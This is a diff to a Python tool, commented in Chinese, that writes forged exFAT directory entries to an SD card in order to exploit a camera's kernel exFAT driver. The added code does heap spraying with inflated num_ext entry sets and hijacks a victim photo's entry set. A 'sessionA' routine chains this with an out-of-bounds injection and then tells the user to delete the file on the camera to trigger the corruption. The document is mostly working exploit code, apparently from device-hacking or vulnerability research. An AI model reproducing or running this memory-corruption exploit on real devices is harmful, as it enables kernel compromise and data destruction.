@@ -40,6 +40,7 @@ import sys
 
 SECTOR = 512
 BACKUP = "/tmp/.exfat_patch_backup.json"
+LAST_HIJACK = {}
 STATE = "/tmp/s5_go1_state.json"
 
 
@@ -388,9 +389,12 @@ def cmd_go1(dev, target_clu, redirect_path):
         dclu = find_dir_clu(dev, "/DCIM/100_PANA")
         if dclu is None:
             print("  !! 找不到 /DCIM/100_PANA（相机还没拍照片？）"); return 2
-        # 排除堆喷文件（名字里带 AAAA 的那些），只挑相机写的正常照片
+        # 排除堆喷文件（AAAA 长名版 / P9000xxx 短名版），只挑相机写的正常照片
+        def _is_spray(n):
+            u = n.upper()
+            return ("AAAA" in u) or u.startswith("P9000")
         jpgs = [(nm, st) for nm, attr, st, sz in list_dir(dev, dclu)
-                if nm.upper().endswith(".JPG") and "AAAA" not in nm]
+                if nm.upper().endswith(".JPG") and not _is_spray(nm)]
         if not jpgs:
             print("  !! 该目录里没有 JPG —— 请先用相机拍几张照片"); return 2
         for nm, st in jpgs:
@@ -474,8 +478,11 @@ def cmd_go2(dev, target_clu, oob_value):
         dclu = find_dir_clu(dev, "/DCIM/100_PANA")
         if dclu is None:
             print("!! 找不到 /DCIM/100_PANA"); return 2
+        def _is_spray(n):
+            u = n.upper()
+            return ("AAAA" in u) or u.startswith("P9000")
         jpgs = [(nm, st) for nm, attr, st, sz in list_dir(dev, dclu)
-                if nm.upper().endswith(".JPG") and "AAAA" not in nm]
+                if nm.upper().endswith(".JPG") and not _is_spray(nm)]
         if not jpgs:
             print("!! 目录里没有 JPG —— 请先拍照"); return 2
         for nm, st in jpgs:
@@ -668,6 +675,538 @@ def cmd_go1check(dev):
     return 0
 
 
+
+
+# ============ 直接构造 exFAT 目录项（用于堆喷：短名字 + 被篡改的 num_ext） ============
+
+def name_hash(name):
+    """exFAT 名字哈希（ASCII 大写/数字/点 时 upcase 为恒等）"""
+    h = 0
+    for ch in name:
+        h = (((h << 15) | (h >> 1)) + ord(ch)) & 0xFFFF
+    return h
+
+
+def set_checksum(entry_set):
+    """exFAT entry set 校验和：跳过前 2 字节之后的 byte2/byte3"""
+    ck = 0
+    for i, b in enumerate(entry_set):
+        if i == 2 or i == 3:
+            continue
+        ck = (((ck << 15) | (ck >> 1)) + b) & 0xFFFF
+    return ck
+
+
+def build_entry_set(name, num_ext, first_cluster, data_len):
+    """构造一个 entry set：File(0x85) + Stream(0xC0) + Name(0xC1) + 填充 0xE0"""
+    n_name = (len(name) + 14) // 15
+    need = 1 + 1 + n_name                      # File + Stream + Name
+    if num_ext + 1 < need:
+        raise ValueError("num_ext 太小")
+    buf = bytearray((num_ext + 1) * 32)
+    # --- File Entry (0x85) ---
+    buf[0] = 0x85
+    buf[1] = num_ext
+    struct.pack_into("<H", buf, 4, 0x20)       # attributes = archive
+    struct.pack_into("<H", buf, 8, 0)          # create time
+    struct.pack_into("<H", buf, 10, 0x50A1)    # create date
+    struct.pack_into("<H", buf, 12, 0)         # mod time
+    struct.pack_into("<H", buf, 14, 0x50A1)
+    struct.pack_into("<H", buf, 16, 0)
+    struct.pack_into("<H", buf, 18, 0x50A1)
+    # --- Stream Extension (0xC0) ---
+    o = 32
+    buf[o] = 0xC0
+    buf[o + 1] = 0x01                          # allocation possible
+    buf[o + 3] = len(name)                     # name length (chars)
+    struct.pack_into("<H", buf, o + 4, name_hash(name))
+    struct.pack_into("<Q", buf, o + 8, data_len)
+    struct.pack_into("<I", buf, o + 20, first_cluster)
+    struct.pack_into("<Q", buf, o + 24, data_len)
+    # --- File Name (0xC1) ---
+    o = 64
+    u = name.encode("utf-16le")
+    for k in range(n_name):
+        buf[o + k * 32] = 0xC1
+        chunk = u[k * 30:(k + 1) * 30]
+        buf[o + k * 32 + 2: o + k * 32 + 2 + len(chunk)] = chunk
+    # --- 填充：Vendor Extension (0xE0) ---
+    for k in range(need, num_ext + 1):
+        buf[k * 32] = 0xE0
+    # --- 校验和 ---
+    struct.pack_into("<H", buf, 2, set_checksum(bytes(buf)))
+    return bytes(buf)
+
+
+def alloc_one_cluster(dev):
+    """★ 安全版：找一个真正空闲的簇。
+       除位图外，还额外检查 FAT[clu]==0，并跳过任何已出现在目录链上的簇。
+       —— 之前只信位图，导致误分配了照片占用的簇，把卡写坏了。"""
+    bm, start, length = read_bitmap(dev)
+    if bm is None:
+        print("  !! 读不到分配位图，拒绝分配"); return None
+    # 收集目录链上已占用的簇，作为额外排除集
+    taken = set()
+    try:
+        dclu = find_dir_clu(dev, "/DCIM/100_PANA")
+        c = dclu
+        while 2 <= c < dev.clu_count + 2 and len(taken) < 200000:
+            taken.add(c)
+            nxt = dev.fat_get(c)
+            if nxt >= 0xFFFFFFF8 or nxt >= dev.clu_count + 2:
+                break
+            c = nxt
+    except Exception:
+        pass
+    for i in range(length * 8):
+        clu = i + 2
+        if clu >= dev.clu_count + 2:
+            break
+        if ((bm[i >> 3] >> (i & 7)) & 1) != 0:
+            continue                      # 位图说已占用
+        if clu in taken:
+            continue                      # 目录链占用
+        fatv = dev.fat_get(clu)
+        if fatv != 0:
+            continue                      # ★ FAT 非 0 ⇒ 其实在用（位图不可信时的兜底）
+        b = bytearray(bm)
+        b[i >> 3] |= (1 << (i & 7))
+        dev.write(dev.seek_clu(start), bytes(b[:dev.cluster_size]))
+        dev.fat_set(clu, 0xFFFFFFFF)
+        return clu
+    return None
+
+
+def cmd_checkalloc(dev):
+    """诊断：核对位图与 FAT 是否一致（找出"位图说空闲、FAT 说在用"的簇）"""
+    bm, start, length = read_bitmap(dev)
+    if bm is None:
+        print("!! 读不到分配位图"); return 2
+    print("== 位图 vs FAT 一致性核查 ==")
+    print("  位图 start_clu=%d  长度=%d B  覆盖 %d 簇" % (start, length, length * 8))
+    bad = []
+    alloc_bit = 0
+    alloc_fat = 0
+    for i in range(length * 8):
+        clu = i + 2
+        if clu >= dev.clu_count + 2:
+            break
+        b = (bm[i >> 3] >> (i & 7)) & 1
+        f = dev.fat_get(clu)
+        if b: alloc_bit += 1
+        if f != 0: alloc_fat += 1
+        if b == 0 and f != 0:
+            bad.append((clu, f))
+    print("  位图标记已分配 : %d 簇" % alloc_bit)
+    print("  FAT 非 0 的簇  : %d 簇" % alloc_fat)
+    print("  ⚠️ 位图说【空闲】但 FAT 非 0 的簇: %d 个" % len(bad))
+    for clu, f in bad[:20]:
+        print("     簇 %-8d FAT=0x%08X" % (clu, f))
+    if len(bad) > 20:
+        print("     ... 还有 %d 个" % (len(bad) - 20))
+    if bad:
+        print()
+        print("  ⇒ 结论：位图与 FAT 不一致！只信位图分配簇会【踩到正在使用的簇】。")
+    else:
+        print("  ⇒ 位图与 FAT 一致。")
+    return 0
+
+
+def cmd_mkspray(dev, count, num_ext, start_idx=0):
+    """★ 堆喷核心：短名字（相机会 stat）+ 篡改 num_ext（撑大 kmalloc 分配）"""
+    dclu = find_dir_clu(dev, "/DCIM/100_PANA")
+    if dclu is None:
+        print("!! 找不到 /DCIM/100_PANA"); return 2
+    ents_per_file = num_ext + 1
+    bufsize = 8 + ents_per_file * 32
+    band = next((b for b in (256, 512, 1024, 2048, 4096) if bufsize <= b), None)
+    print("== mkspray ==")
+    print("  目录 start_clu = %d" % dclu)
+    print("  每个文件: num_ext=%d → %d 个目录项 → bufsize≈%d → kmalloc-%s"
+          % (num_ext, ents_per_file, bufsize, band))
+    print("  计划创建 %d 个，共需 %d 个目录项（%d 字节）"
+          % (count, count * ents_per_file, count * ents_per_file * 32))
+    # 1) 收集目录簇链
+    chain = []
+    c = dclu
+    while 2 <= c < dev.clu_count + 2 and len(chain) < 4096:
+        chain.append(c)
+        nxt = dev.fat_get(c)
+        if nxt >= 0xFFFFFFF8 or nxt >= dev.clu_count + 2:
+            break
+        c = nxt
+    print("  目录簇链: %s (共 %d 簇)" % (chain[:6], len(chain)))
+    # 2) 找写入起点（第一个 0x00 结束标记的位置）
+    per_clu = dev.cluster_size // 32
+    used = 0
+    for clu in chain:
+        data = dev.read(dev.seek_clu(clu), dev.cluster_size)
+        for i in range(per_clu):
+            if data[i * 32] == 0x00:
+                break
+            used += 1
+        else:
+            continue
+        break
+    total_slots = len(chain) * per_clu
+    print("  已用目录项 = %d，总槽位 = %d，剩余 = %d" % (used, total_slots, total_slots - used))
+    need = count * ents_per_file
+    # 3) 不够就扩链
+    while total_slots - used < need:
+        nc = alloc_one_cluster(dev)
+        if nc is None:
+            print("  !! 没有空闲簇"); return 2
+        dev.write(dev.seek_clu(nc), b"\x00" * dev.cluster_size)
+        dev.fat_set(chain[-1], nc)
+        chain.append(nc)
+        total_slots += per_clu
+        print("  扩展目录: 新增簇 %d (链长 %d)" % (nc, len(chain)))
+    # 4) 逐个写入 entry set
+    made = 0
+    slot = used
+    for k in range(count):
+        name = "P%07d.JPG" % (9000000 + start_idx + k)
+        dcl = alloc_one_cluster(dev)
+        if dcl is None:
+            print("  !! 数据簇用尽"); break
+        dev.write(dev.seek_clu(dcl), b"\xff\xd8\xff\xe0" + b"\x00" * 200)
+        es = build_entry_set(name, num_ext, dcl, 204)
+        for j in range(ents_per_file):
+            idx = slot + j
+            ci = idx // per_clu
+            off = dev.seek_clu(chain[ci]) + (idx % per_clu) * 32
+            dev.write(off, es[j * 32:(j + 1) * 32])
+        slot += ents_per_file
+        made += 1
+    dev.sync()
+    print("  ✅ 已写入 %d 个 entry set（每个 %d 项）" % (made, ents_per_file))
+    print("  ⇒ 相机 stat 这些 P9000xxx.JPG 时，会分配 kmalloc-%s 的 entry-set 缓冲" % band)
+    return 0
+
+
+
+
+def scan_dir_entries(dev, clu):
+    """遍历目录，返回 [(槽位号, entry类型, 簇, 簇内偏移, entry集合起点, num_ext), ...]"""
+    out = []
+    slot = 0
+    c = clu
+    while 2 <= c < dev.clu_count + 2 and slot < 200000:
+        data = dev.read(dev.seek_clu(c), dev.cluster_size)
+        per = dev.cluster_size // 32
+        for i in range(per):
+            et = data[i * 32]
+            if et == 0x00:
+                return out, c, slot
+            out.append((slot, et, c, i * 32, data))
+            slot += 1
+        nxt = dev.fat_get(c)
+        if nxt >= 0xFFFFFFF8 or nxt >= dev.clu_count + 2:
+            break
+        c = nxt
+    return out, c, slot
+
+
+def find_entry_offset(dev, dclu, want_name):
+    """在目录里定位某个文件名的 File Entry(0x85)，返回 (簇, 簇内偏移, num_ext, 原entry集合)"""
+    c = dclu
+    while 2 <= c < dev.clu_count + 2:
+        data = dev.read(dev.seek_clu(c), dev.cluster_size)
+        i = 0
+        while i + 32 <= len(data):
+            et = data[i]
+            if et == 0x00:
+                return None
+            if et == 0x85:
+                n = data[i + 1] + 1
+                if i + n * 32 > len(data):
+                    return None
+                st = data[i:i + n * 32]
+                name = ""
+                for e in range(1, n):
+                    if st[e * 32] == 0xC1:
+                        name += st[e * 32 + 2:e * 32 + 32].decode("utf-16le", "replace")
+                if name.rstrip("\x00").upper() == want_name.upper():
+                    return (c, i, data[i + 1], data[i:i + n * 32])
+                i += n * 32
+                continue
+            i += 32
+        nxt = dev.fat_get(c)
+        if nxt >= 0xFFFFFFF8 or nxt >= dev.clu_count + 2:
+            break
+        c = nxt
+    return None
+
+
+def cmd_hijack(dev, want_name, num_ext):
+    """★ 方案A：把受害者照片的目录项改成【短名 + 篡改 num_ext + 填充载荷】
+       目的：删除它时，它自己的 entry-set 缓冲在 exfat_free_cluster() 时【仍然活着】。"""
+    dclu = find_dir_clu(dev, "/DCIM/100_PANA")
+    if dclu is None:
+        print("!! 找不到 /DCIM/100_PANA"); return 2
+    if want_name in ("auto", "", None):
+        def _spray(n):
+            u = n.upper()
+            return ("AAAA" in u) or u.startswith("P9000")
+        cands = [nm for nm, at, st, sz in list_dir(dev, dclu)
+                 if nm.upper().endswith(".JPG") and not _spray(nm)]
+        if not cands:
+            print("!! 目录里没有相机拍的照片"); return 2
+        want_name = cands[0]
+        print("[i] auto 选中: %s" % want_name)
+    hit = find_entry_offset(dev, dclu, want_name)
+    if hit is None:
+        print("!! 目录里找不到 %s" % want_name)
+        print("   现有文件（前 12 个）:")
+        for nm, attr, st, sz in list_dir(dev, dclu)[:12]:
+            print("     ", nm)
+        return 2
+    c0, off0, old_ne, orig = hit
+    # 从原 entry set 里取出 stream 信息
+    name, first_clu, data_len = "", 0, 0
+    n_name = 0
+    for e in range(1, old_ne + 1):
+        t = orig[e * 32]
+        if t == 0xC0:
+            n_name = orig[e * 32 + 3]
+            first_clu = struct.unpack_from("<I", orig, e * 32 + 20)[0]
+            data_len = struct.unpack_from("<Q", orig, e * 32 + 24)[0]
+        elif t == 0xC1:
+            name += orig[e * 32 + 2:e * 32 + 32].decode("utf-16le", "replace")
+    name = name.rstrip("\x00")
+    ents = num_ext + 1
+    bufsize = 8 + ents * 32
+    band = next((b for b in (256, 512, 1024, 2048, 4096) if bufsize <= b), None)
+    print("== 方案A：劫持受害者自身的 entry set ==")
+    print("  目标文件   : %s" % name)
+    print("  原 num_ext : %d（%d 项）" % (old_ne, old_ne + 1))
+    print("  新 num_ext : %d（%d 项）" % (num_ext, ents))
+    print("  起始簇     : %d   数据长度: %d" % (first_clu, data_len))
+    print("  新缓冲大小 : %d B → kmalloc-%s" % (bufsize, band))
+    print("  位置       : 簇 %d 内偏移 %d（槽位 %d）"
+          % (c0, off0, (c0 - dclu) * (dev.cluster_size // 32) + off0 // 32))
+    # 构造新 entry set（名字保持原样 → 相机的命名规则照样认得）
+    es = build_entry_set(name, num_ext, first_clu, data_len)
+    # 写回（可能跨簇：按槽位逐个写）
+    per_clu = dev.cluster_size // 32
+    slot0 = off0 // 32
+    # 建立 槽位 -> (簇, 簇内偏移)
+    chain = []
+    c = dclu
+    while 2 <= c < dev.clu_count + 2 and len(chain) < 4096:
+        chain.append(c)
+        nxt = dev.fat_get(c)
+        if nxt >= 0xFFFFFFF8 or nxt >= dev.clu_count + 2:
+            break
+        c = nxt
+    need_slots = slot0 + ents
+    if need_slots > len(chain) * per_clu:
+        print("  !! 目录空间不足（需要 %d 槽，只有 %d）" % (need_slots, len(chain) * per_clu))
+        return 2
+    for j in range(ents):
+        idx = slot0 + j
+        ci = idx // per_clu
+        dev.write(dev.seek_clu(chain[ci]) + (idx % per_clu) * 32, es[j * 32:(j + 1) * 32])
+    dev.sync()
+    print("  ✅ 已写入 %d 项" % ents)
+    print()
+    print("  ★ 接下来删除这个文件时，内核流程是：")
+    print("       查找它 → 分配 kmalloc-%s 缓冲（内容=我们写的目录项）" % band)
+    print("       → exfat_free_cluster() 【OOB 就发生在这里，缓冲仍活着】")
+    print("       → 最后才 kfree")
+    print("  ★ 缓冲前 8 字节 = 0x%02X,%d,0x%02X,0x%02X,... → 当作指针是野地址"
+          % (es[0], es[1], es[2], es[3]))
+    print()
+    global LAST_HIJACK
+    LAST_HIJACK = {"name": name, "cluster": first_clu, "num_ext": num_ext}
+    print("  受害者起始簇 = %d   ⇒ 下一步用: go2 注入这个簇" % first_clu)
+    return 0
+
+
+def cmd_sessionA(dev, name, num_ext):
+    """方案A 一体化：劫持受害者 entry set → 越界注入 → 打印 GO"""
+    global LAST_HIJACK
+    LAST_HIJACK = {}
+    print("############ 方案A：受害者自身 entry set 劫持 ############")
+    rc = cmd_hijack(dev, name, num_ext)
+    if rc != 0 or not LAST_HIJACK:
+        print("!! hijack 失败，终止"); return 2
+    clu = LAST_HIJACK["cluster"]
+    print()
+    print("############ 越界注入（受害者起始簇 %d） ############" % clu)
+    rc = cmd_go2(dev, clu, 524290)
+    if rc != 0:
+        print("!! go2 失败，不要去相机！"); return 2
+    print()
+    print("############################################################")
+    print("###  ★ 拔卡插进相机，【删除 %s】             " % LAST_HIJACK["name"])
+    print("###  删完拔卡插回 Mac，在这里按【回车】                     ")
+    print("############################################################")
+    return 0
+
+
+
+
+def dir_space(dev, dclu, need_slots):
+    """返回 (目录簇链, 已用槽位数)；不足时自动扩链。"""
+    chain = []
+    c = dclu
+    while 2 <= c < dev.clu_count + 2 and len(chain) < 8192:
+        chain.append(c)
+        nxt = dev.fat_get(c)
+        if nxt >= 0xFFFFFFF8 or nxt >= dev.clu_count + 2:
+            break
+        c = nxt
+    per = dev.cluster_size // 32
+    used = 0
+    for clu in chain:
+        data = dev.read(dev.seek_clu(clu), dev.cluster_size)
+        done = False
+        for i in range(per):
+            if data[i * 32] == 0x00:
+                done = True; break
+            used += 1
+        if done:
+            break
+    while len(chain) * per - used < need_slots:
+        nc = alloc_one_cluster(dev)
+        if nc is None:
+            raise SystemExit("!! 没有空闲簇")
+        dev.write(dev.seek_clu(nc), b"\x00" * dev.cluster_size)
+        dev.fat_set(chain[-1], nc)
+        chain.append(nc)
+    return chain, used
+
+
+def cmd_mkentries(dev, count, namelen, start_idx=0):
+    """★ 定因工具：精确写 N 个【指定名字长度】的目录项（空文件，无数据簇，无副档名）
+       ⇒ 可精确控制目录总字节数 / entry set 大小 / 跨簇数。"""
+    dclu = find_dir_clu(dev, "/DCIM/100_PANA")
+    if dclu is None:
+        print("!! 找不到 /DCIM/100_PANA"); return 2
+    n_name = (namelen + 14) // 15
+    num_ext = 1 + n_name
+    ents = num_ext + 1
+    esz = ents * 32
+    total = count * esz
+    print("== mkentries ==")
+    print("  名字长度 %d → Name项 %d, num_ext %d, entries %d, entry set = %d B"
+          % (namelen, n_name, num_ext, ents, esz))
+    print("  数量 %d → 目录内容共 %d B (~%d KB)" % (count, total, total // 1024))
+    chain, used = dir_space(dev, dclu, count * ents)
+    per = dev.cluster_size // 32
+    print("  目录簇链: %s (%d 簇, 共 %d 槽位)"
+          % (chain[:5], len(chain), len(chain) * per))
+    print("  已用 %d 槽，写完后占用 %d 槽 → 占 %d 簇空间"
+          % (used, used + count * ents, (used + count * ents + per - 1) // per))
+    if len(chain) < 3:
+        print("  （当前目录跨 %d 簇）" % len(chain))
+    made = 0
+    slot = used
+    for k in range(count):
+        base = "P%07d" % (9000000 + start_idx + k)
+        pad = namelen - len(base) - 4
+        name = base + ("A" * max(pad, 0)) + ".JPG" if pad > 0 else base + ".JPG"
+        dcl = alloc_one_cluster(dev)          # 给真实数据簇（更贴近原始触发场景）
+        if dcl is None:
+            print("  !! 数据簇用尽，已写 %d 个" % made); break
+        dev.write(dev.seek_clu(dcl), b"\xff\xd8\xff\xe0" + b"\x00" * 200)
+        es = build_entry_set(name, num_ext, dcl, 204)
+        for j in range(ents):
+            idx = slot + j
+            ci = idx // per
+            dev.write(dev.seek_clu(chain[ci]) + (idx % per) * 32, es[j * 32:(j + 1) * 32])
+        slot += ents
+        made += 1
+    dev.sync()
+    print("  ✅ 已写 %d 个 entry set，目录内容 %d B" % (made, made * esz))
+    return 0
+
+
+
+
+def cmd_trimdir(dev, keep_slots):
+    """把 /DCIM/100_PANA 目录从第 keep_slots 个槽位起全部清零。
+       ⇒ 不需要重新格式化相机，就能把测试用的目录项清干净。"""
+    dclu = find_dir_clu(dev, "/DCIM/100_PANA")
+    if dclu is None:
+        print("!! 找不到 /DCIM/100_PANA"); return 2
+    chain = []
+    c = dclu
+    while 2 <= c < dev.clu_count + 2 and len(chain) < 8192:
+        chain.append(c)
+        nxt = dev.fat_get(c)
+        if nxt >= 0xFFFFFFF8 or nxt >= dev.clu_count + 2:
+            break
+        c = nxt
+    per = dev.cluster_size // 32
+    print("== trimdir ==    目录链 %s (%d 簇, %d 槽)"
+          % (chain[:5], len(chain), len(chain) * per))
+    # 打印保留区内容，确认只保留相机照片
+    print("  保留的前 %d 个槽:" % keep_slots)
+    slot = 0
+    for clu in chain:
+        data = dev.read(dev.seek_clu(clu), dev.cluster_size)
+        for i in range(per):
+            if slot >= keep_slots:
+                break
+            t = data[i * 32]
+            tag = {0x85: "File", 0xC0: "Stream", 0xC1: "Name", 0x00: "(空)"}.get(t, "0x%02X" % t)
+            print("    槽 %-4d 类型 %s" % (slot, tag))
+            slot += 1
+        if slot >= keep_slots:
+            break
+    cleared = 0
+    slot = 0
+    for clu in chain:
+        data = bytearray(dev.read(dev.seek_clu(clu), dev.cluster_size))
+        ch = False
+        for i in range(per):
+            if slot >= keep_slots and data[i * 32] != 0x00:
+                data[i * 32:(i + 1) * 32] = b"\x00" * 32
+                cleared += 1; ch = True
+            slot += 1
+        if ch:
+            dev.write(dev.seek_clu(clu), bytes(data))
+    dev.sync()
+    print("  ✅ 已清零 %d 个槽（从槽 %d 起）" % (cleared, keep_slots))
+    print("  ⇒ 目录回到干净状态，相机应能正常开机")
+    return 0
+
+
+
+
+def cmd_mkdeleted(dev, count):
+    """定因对照：往目录里塞 count 个【已删除条目(0x05)】。
+       它们只占目录空间，驱动会直接跳过 ⇒ 不产生任何 entry-set 分配。
+       若相机照样崩 ⇒ 触发条件是【目录体量】；若不崩 ⇒ 是【长名分配】。"""
+    dclu = find_dir_clu(dev, "/DCIM/100_PANA")
+    if dclu is None:
+        print("!! 找不到 /DCIM/100_PANA"); return 2
+    total = count * 32
+    print("== mkdeleted（对照组：只占空间、无分配） ==")
+    print("  写入 %d 个已删除条目(0x05) → 目录内容 %d B (~%d KB)"
+          % (count, total, total // 1024))
+    chain, used = dir_space(dev, dclu, count)
+    per = dev.cluster_size // 32
+    print("  目录簇链: %s (%d 簇, %d 槽)" % (chain[:5], len(chain), len(chain) * per))
+    # 构造一个"已删除的 File 条目"：类型 0x05，其余字节填可识别模式
+    ent = bytearray(32)
+    ent[0] = 0x05
+    for i in range(1, 32):
+        ent[i] = (i * 7) & 0xFF
+    slot = used
+    for k in range(count):
+        idx = slot + k
+        ci = idx // per
+        dev.write(dev.seek_clu(chain[ci]) + (idx % per) * 32, bytes(ent))
+    dev.sync()
+    print("  ✅ 已写 %d 个已删除条目（占 %d 槽，共 %d 簇）"
+          % (count, count, (used + count + per - 1) // per))
+    print("  ⇒ 目录体量 ≈ %d KB，但【没有任何 entry-set 分配】" % (total // 1024))
+    return 0
+
+
 def cmd_bitmap(dev):
     """读根目录里的分配位图目录项(0x81)，算出 map_sectors 与越界阈值簇号。"""
     clu = dev.root_clu
@@ -855,6 +1394,22 @@ def main():
         tc = int(a[2]) if len(a) > 2 and a[2].isdigit() else None
         ov = int(a[3], 0) if len(a) > 3 else 524290          # 默认 index 128
         sys.exit(cmd_go2(d, tc, ov))
+    elif mode == "sessionA":
+        sys.exit(cmd_sessionA(Dev(a[1]), a[2], int(a[3])))
+    elif mode == "hijack":
+        sys.exit(cmd_hijack(Dev(a[1]), a[2], int(a[3])))
+    elif mode == "checkalloc":
+        sys.exit(cmd_checkalloc(Dev(a[1])))
+    elif mode == "mkdeleted":
+        sys.exit(cmd_mkdeleted(Dev(a[1]), int(a[2])))
+    elif mode == "trimdir":
+        sys.exit(cmd_trimdir(Dev(a[1]), int(a[2])))
+    elif mode == "mkentries":
+        sys.exit(cmd_mkentries(Dev(a[1]), int(a[2]), int(a[3]),
+                               int(a[4]) if len(a) > 4 else 0))
+    elif mode == "mkspray":
+        sys.exit(cmd_mkspray(Dev(a[1]), int(a[2]), int(a[3]),
+                             int(a[4]) if len(a) > 4 else 0))
     elif mode == "verdict":
         sys.exit(cmd_verdict(Dev(a[1])))
     elif mode == "go1check":
